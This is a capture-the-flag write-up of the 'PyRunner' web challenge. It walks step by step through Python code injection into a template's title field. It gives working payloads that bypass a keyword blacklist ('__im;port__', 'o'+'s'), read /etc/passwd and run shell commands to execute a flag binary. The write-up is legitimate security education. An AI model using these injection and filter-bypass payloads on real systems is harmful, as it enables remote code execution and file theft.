# STACK The Flags CTF Writeup

STACK The Flags (Category 2: University, Polytechnics)

Link: https://ctf.hackthebox.com/event/747

Challenge: PyRunner

![](./images/Pasted%20image%2020221203160910.png)

---

## Target

The target is `157.245.52.169:32757`, which when navigated to, presents me with a simple web app that executes Python templates:

![](./images/Pasted%20image%2020221203010534.png)

Interacting with the dropdown displays another template, _"Webserver Template Duplicate"_, which (when selected) renders an **Arguments** section below the (disabled/not-editable) template source, allowing us to create new templates with a `title`, `host` and `port`:

![](./images/Screenshot%202022-12-03%20at%201.10.02%20AM.png)

Ok, so this challenge seems like it will deal with **command injection**, specifically—injecting a malicious command into one of those input fields.

### Files

The challenge also provided the source code for the webapp:

![](./images/Pasted%20image%2020221203060133.png)

Some files of interest:

![](./images/Pasted%20image%2020221203012946.png)
![](./images/Pasted%20image%2020221203013012.png)

So this is _definitely_ a command injection / arbitrary command execution challenge. But first, I have to figure out which of the 3 input fields is vulnerable to injection.

When a newly-created template is run, the server calls the `run_template` function, which extracts the arguments passed through the 3 input fields and passes them through a rudimentary word filter which replacing certain blacklisted plaintext strings with empty strings, `""`.

```py
contents.replace(f"<{argument}>", textfilter(data["arguments"][argument]))
```

```py
# textfilter function pretty much just replaces instances
# of the following strings with an empty string, ""
disallowed = ["import", ";", "\n", "eval", "exec", "os"]
# system isn't blacklisted...
```

I find that `title` is the only passed argument that gets printed out in the server-hosted `template.py` file (line 11), so this will be my target input to inject commands into.

```py
print("Webserver: <title>")
#                  ^^^^^
```

So the general format of the injection will look something like `test>", {injection}) #` , which will turn the line above into:

```py
print("Webserver: <test>", {injection}) #")
```

### Command Injection

First I tried a simple injection just to check if I can get the server to perform some sort of calculation, to confirm that the injection was successful:

`test>", 1+2) #`

![](./images/Pasted%20image%2020221203015436.png)

_Niiice_, arbitrary command execution. Now to figure out how to spit out stuff that is actually useful.

---

`test>", system("ls")) #`

Since `system` isn't blocked, I can theoretically use it for command execution, however it isn't imported in `template.py`, so (predictably) this injection fails for this exact reason:

![](./images/Pasted%20image%2020221203014700.png)

Maybe I can import it inline? Going for a `system` call seems like the obvious approach, however, `;` are filtered out, as well as `import`, so there's some thinking to be done before I can use it.

---

After some time studying python command injection, I found that imports can be done via many alternative syntaxes, specifically:

- `__import__("os").system("ls")`
- `imp.os.system("ls")`

These might come in handy, however they still fail since either `import` or `os` is still present in the command string:

`test>", __import__('os').system('ls -la')) #>")`

![](./images/Pasted%20image%2020221203023737.png)

---

Time to switch gears, let's see what I can do with other commands which aren't blacklisted.

`test>", open("/etc/passwd").read()) #>")`

![](./images/Pasted%20image%2020221203030819.png)

_Very interesting_. Ok, so open seems promising, but I'm not sure if it's necessarily useful since I don't know
the filename or location of the flag... (Hindsight: turns out I _did_ know via included `Dockerfile`, but I ended up
going with a different approach.)

---

### What about the filenames?

Every created template is saved with a randomly generated filename:

![](./images/Pasted%20image%2020221203032208.png)

and the server sends back a response containing a computed output by a **juicy** `subprocess.run()` call that can run _anything_ in the `/scripts` directory…

![](./images/Pasted%20image%2020221203032329.png)

![](./images/Pasted%20image%2020221203032250.png)

Maybe I can write a malicious script to the location of an existing template?

But how do I get around the random `filename` generation? On second thought, this doesn't seem like the right approach (hindsight: it wasn't).

---

### Back to inline import approach

After messing around with some more ideas on how to bypass the blacklist, I discovered that I can get
the string `"import"` through the filter by sticking a `;` in it, however it didn't work for `"os"`—which I discovered
I can bypass by simply concatenating `“o” + “s”`:

`test>", __im;port__('o'+'s').system('ls -la')) #>")`

![](./images/Screenshot%202022-12-03%20at%204.17.54%20AM.png)

Very close! Now it's just a matter of finding the flag in the filesystem. Since semicolons are blacklisted (filtered out), let's try using `&&` to chain commands:

`test>", __im;port__('o'+'s').system('cd .. && ls -la')) #>")`

![](./images/Pasted%20image%2020221203043442.png)

Finally, I found a file named `readflag`, however I can't seem to `cat` it out, nor can I `file readflag` its contents to even identify what it is. So using `stat`, I get some more information about this `cat`-immune file:

`test>", __im;port__('o'+'s').system('cd ../&& ls -la && stat readflag')) #>")`

![](./images/Pasted%20image%2020221203045642.png)

Very close! Now it's just a matter of finding the flag in the filesystem. Since semicolons are blacklisted
(filtered out), let's try using `&&` to chain commands:

`test>", __im;port__('o'+'s').system('cd ../&& ls -la && stat readflag && od -c -tx1 readflag')) #>")`

![](./images/Pasted%20image%2020221203050617.png)

Finally, I found a `readflag` file, which (given the included `Dockerfile`) we know is an executable binary.

![](./images/Pasted%20image%2020221204195414.png)

### Final payload:

```
test>",__im;port__('o'+'s').system('cd ../&& ls -la && stat readflag && ./readflag')) #
```

![](./images/Pasted%20image%2020221204210105.png)

### 🏴‍☠️ Flag:

```
STF22{4ut0m4t3d_c0mm4nd_1nj3ct10n}
```
